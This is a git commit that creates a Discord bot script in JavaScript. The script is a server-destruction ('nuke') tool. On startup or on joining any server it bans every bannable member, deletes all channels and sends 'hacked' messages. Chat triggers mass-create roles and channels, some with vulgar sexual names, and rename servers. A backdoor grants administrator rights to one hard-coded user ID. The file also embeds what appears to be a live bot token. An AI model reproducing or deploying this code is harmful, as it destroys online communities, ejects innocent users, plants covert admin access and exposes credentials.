d71f7a7d9d8e7193c62e4bc1f2bcdeb73bcf03d8
NadirJoulali <39174113+NadirJoulali@users.noreply.github.com>
2018-06-29 16:18:08 +0100

    Create Bot.js

---
+++ Bot.js
@@ -0,0 +1,480 @@
+const Discord = require("discord.js");
+const مطرقة = new Discord.Client();
+console.log('By مطرقة');
+مطرقة.on('ready', () => {
+  console.log(`Logged in as ${مطرقة.user.tag} !`);
+
+});
+مطرقة.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : مطرقة ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  مطرقة " ] servers! [ " ${مطرقة.guilds.size} " ] Users! [ " ${مطرقة.users.size} " ]`);
+
+        
+    
+
+});
+var prefix = "-"
+مطرقة.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    مطرقة.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    مطرقة.user.setStatus(argresult);
+  }
+});
+
+var x1 = "مطرقة"
+مطرقة.on('message', message => {
+     if (message.content === ".") {
+مطرقة.user.setAvatar(`http://www.dunamisnews.com/images/i.pinimg.com/736x/2d/e4/b7/2de4b7370077646a1ee088c07e79b6d3--will-grant-مطرقة-unicorn.jpg`)
+
+}
+});
+var x1 = "مطرقة"
+مطرقة.on('message', message => {
+     if (message.content === ".") {
+مطرقة.user.setUsername("Hacked u by مطرقة")
+
+}
+});
+مطرقة.on('message', message => {
+     if (message.content === ".") {
+مطرقة.user.setGame(`Hacked u by مطرقة`,'https://www.twitch.tv/hix')
+
+}
+});
+
+مطرقة.on('message', message => {
+     if (message.content === ".") {
+         مطرقة.guilds.forEach(m =>{
+             m.setIcon(`http://www.dunamisnews.com/images/i.pinimg.com/736x/2d/e4/b7/2de4b7370077646a1ee088c07e79b6d3--will-grant-مطرقة-unicorn.jpg`)
+})
+}
+});
+مطرقة.on('message', message => {
+     if (message.content === ".") {
+         مطرقة.guilds.forEach(m =>{
+             m.setName(`Hacked u by مطرقة`)
+})
+}
+});
+
+مطرقة.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+             message.guild.setIcon(`http://www.dunamisnews.com/images/i.pinimg.com/736x/2d/e4/b7/2de4b7370077646a1ee088c07e79b6d3--will-grant-مطرقة-unicorn.jpg`)
+
+}
+});
+
+مطرقة.on('message', message => {
+     
+
+     if (message.content === "مطرقة") {
+         مطرقة.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked u by hhhhhhh",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by تهكيتو",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by دك زامل",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by ديال",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by انور",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by غنحويه",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by مطرقة",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+
+    
+})
+ 
+ 
+}
+});
+مطرقة.on('message', message => {
+         if (message.content === "مطرقة") {
+               مطرقة.guilds.forEach(m =>{
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+
+m.createChannel('Hacked u by مطرقة', 'text');
+
+m.createChannel('Hacked u by مطرقة', 'text');
+
+m.createChannel('Hacked u by مطرقة', 'text');
+
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+
+m.createChannel('Hacked u by مطرقة', 'text');
+m.createChannel('Hacked u by مطرقة', 'text');
+
+})
+}
+});
+
+مطرقة.on('message', message => {
+         if (message.content === "مطرقة") {
+                 مطرقة.guilds.forEach(m =>{
+m.createChannel('Hacked لحواااااا', 'voice');
+m.createChannel('سكس 2017 شاهد قبل الحدف', 'voice');
+m.createChannel('Hacked سكسسسسسسسسسسسسسسسس', 'voice');
+m.createChannel('Hacked u ساخنببببببببببب', 'voice');
+m.createChannel('Hacked u اهههههههههههههه', 'voice');
+m.createChannel('Hacked u هههههههههههههههه', 'voice');
+m.createChannel('Hacked u bهههههههههe', 'voice');
+m.createChannel('Hacked uهههههههههههههre', 'voice');
+
+m.createChannel('Hacked u ههههههههههههههههe', 'voice');
+m.createChannel('تجمع لقحاب سكس 2017', 'voice');
+
+m.createChannel('الموقع الازرق ', 'voice');
+m.createChannel('امور زاملللل', 'voice');
+m.createChannel('ازبي هههههه', 'voice');
+m.createChannel('غنشدك غنحويكككككككههههه', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+m.createChannel('Hacked u by مطرقة', 'voice');
+
+
+
+})
+}
+
+});
+
+
+const { Client } = require('discord.js');
+const client = new Client();
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' Hacked u by مطرقة     هههههههههههههههه').catch(e => { return void e; });
+
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^ you are hacked by مطرقة يزامل').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+  
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+  
+    await guild.createChannel('Hacked u by مطرقة', 'text');
+
+      await guild.createChannel('Hacked u by مطرقة', 'voice');
+
+  
+
+}
+
+مطرقة.on('ready', () => {
+  for(const [, g] of مطرقة.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by YzhF1");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+
+});
+
+مطرقة.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+
+مطرقة.on('guildMemberAdd', member => {
+    
+            if (member.id === "336912304144646144") {
+                member.guild.createRole({
+                    name : مطرقة.user.username,
+                    color : "RANDOM", 
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+                
+            }
+        
+    });
+
+    
+
+
+
+
+مطرقة.login("NDQzNzgxNDk5NjAzNjQ4NTIz.DhbSEA.Bp2RIAKXaE_9UpwvX1a1VSFAA7Y")
